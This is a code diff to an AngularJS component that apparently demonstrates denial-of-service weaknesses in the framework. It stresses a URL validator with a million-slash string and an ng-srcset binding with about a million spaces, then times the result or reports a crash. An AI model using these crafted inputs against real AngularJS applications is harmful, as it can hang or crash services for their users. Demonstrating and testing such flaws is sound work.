@@ -9,8 +9,8 @@ appModule.component('appComponent', {
   controller: controller,
 });
 
-controller.$inject = ['$locale', '$timeout', '$resource', '$timeout']
-function controller($locale, $timeout, $resource, $timeout) {
+controller.$inject = ['$locale', '$timeout', '$resource', '$timeout', '$scope', '$compile']
+function controller($locale, $timeout, $resource, $timeout, $scope, $compile) {
   'ngInject';
   const ctrl = this;
   ctrl.currencySymbol = '$';
@@ -43,7 +43,7 @@ function controller($locale, $timeout, $resource, $timeout) {
   }
 
   ctrl.validator = () => {
-    ctrl.url = `scheme:${'/'.repeat(1000000)}`; 
+    ctrl.url = `scheme:${'/'.repeat(1000000)}`;
     ctrl.urlInputController = ctrl.urlInput.controller('ngModel');
     let urlInputValidators = ctrl.urlInputController.$validators;
     ctrl.urlInputController.$validators = {};
@@ -56,22 +56,27 @@ function controller($locale, $timeout, $resource, $timeout) {
 
   ctrl.ngSrcSetDdosNow = () => {
     try {
-        ctrl.ngSrcSetDdos = 'https://placehold.co/600x400, ' + ' '.repeat(2 ** 30)
-        this.ngSrcSetCompiledElem.html(`<img ng-srcset="${this.ngSrcSet}">`);
-        const scope = this.ngSrcSetCompiledElem.scope();
+        ctrl.ngSrcSetDdos = `https://placehold.co/600x400 2x, ${' '.repeat(2 ** 20)}http://example.com/image.png`
+        ctrl.ngSrcSetCompiledElem.html(`<img ng-srcset="${ctrl.ngSrcSetDdos}">`);
 
+        const scope = ctrl.ngSrcSetCompiledElem.scope();
         const start = performance.now();
-        this.$compile(this.ngSrcSetCompiledElem)(scope);
-        this.$rootScope.$apply();
+        $compile(ctrl.ngSrcSetCompiledElem)(scope);
+        $scope.$root.$applyAsync();
         const end = performance.now();
 
-        this.duration = `${((end - start) / 1000).toFixed(2)} seconds`;
+        //const start = performance.now();
+        //$compile(ctrl.ngSrcSetCompiledElem)($scope);
+        //$scope.$applyAsync();
+        //const end = performance.now();
+
+        ctrl.duration = `${((end - start) / 1000).toFixed(2)} seconds`;
       } catch (err) {
         console.error(err);
 
-        this.duration = '(APP CRASHED)';
+        ctrl.duration = '(APP CRASHED)';
       } finally {
-        this.$rootScope.$apply(); // apply the duration change
+        $scope.$applyAsync()
       }
   }
 
